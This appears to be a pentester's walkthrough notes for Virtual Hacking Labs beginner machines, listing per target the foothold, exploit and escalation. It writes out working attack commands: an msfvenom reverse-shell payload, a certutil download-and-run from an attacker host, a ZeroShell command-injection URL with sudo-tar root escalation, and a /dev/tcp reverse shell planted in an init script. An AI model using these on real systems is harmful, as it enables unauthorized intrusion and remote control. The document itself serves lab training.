## Virtual Hacking Labs

### Beginner
#### 10.11.1.36 (Steven)
```bash
Foothold -> Found Wing FTP Server and Login with admin:admin  
Exploit -> RCE

msfvenom -p windows/shell_reverse_tcp LHOST=172.16.1.1 LPORT=4444 -f exe > shell-x86.exe

os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://172.16.1.1:8080/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')

Escalate -> Don't need
```
#### 10.11.1.48 (Android)
```bash
Foothold -> Found Port 5555 (adb)
Exploit -> Connect with ADB Tool

./adb connect 10.11.1.48:5555
./adb shell

Escalate -> Just su to root
```
#### 10.11.1.60 (Zero)
```bash
Foothold -> Found ZeroShell

Exploit -> RCE
https://10.11.1.60/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509view&User=Admin&x509type='%0Auname -a%0A'

Linux zeroshell 4.14.29-ZS #4 SMP Mon Mar 26 23:04:36 CEST 2018 i686 GenuineIntel unknown GNU/Linux Linux zeroshell 4.14.29-ZS #4 SMP Mon Mar 26 23:04:36 CEST 2018 i686 GenuineIntel unknown GNU/Linux

Escalate -> sudo by tar
https://10.11.1.60/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509view&User=Admin&x509type='%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id%0A'

uid=0(root) gid=0(root) groups=0(root) uid=0(root) gid=0(root) groups=0(root) 
```
Reference  
 -> https://www.exploit-db.com/exploits/49096  
 -> https://www.tarlogic.com/advisories/zeroshell-rce-root.txt

#### 10.11.1.74 (Mantis)
```bash
Foothold -> Read robots.txt and Found http://10.11.1.74/mantisbt-2.3.0
Exploit1 -> Try to Use RCE (Unauthenticated) it's work but it's a rabbit hole.
Exploit2 -> Use Reset Administrator Password to Exploit
User -> Investigate The Page and Found SSH credential and Use it.
Root -> sudo -l and Found "(ALL : ALL) ALL" Then sudo su
```

#### 10.11.1.83 (John)
```bash
Foothold -> Found Target is Windows XP and Open 445
Exploit -> MS08-067 and MS17-010
```

#### 10.11.1.95 (James)
```bash
Foothold -> Found Apache James Server 2.3.2
Exploit -> Use Public Exploit from https://www.exploit-db.com/exploits/50347

sudo -l
(root) NOPASSWD: /sbin/reboot

Found Can Edit /etc/init.d/james

Escalate -> Edit /etc/init.d/james

---/etc/init.d/james---
#!/bin/bash
sudo JAVA_HOME=/usr/lib/jvm/default-java /home/james/shell.sh
-----------------------

Escalate -> Create shell.sh
---shell.sh---
#!/bin/bash
/bin/bash -i >& /dev/tcp/172.16.1.2/80 0>&1
--------------

Escalate -> sudo /sbin/reboot
```

#### 10.11.1.109 (AS45)
```bash

```
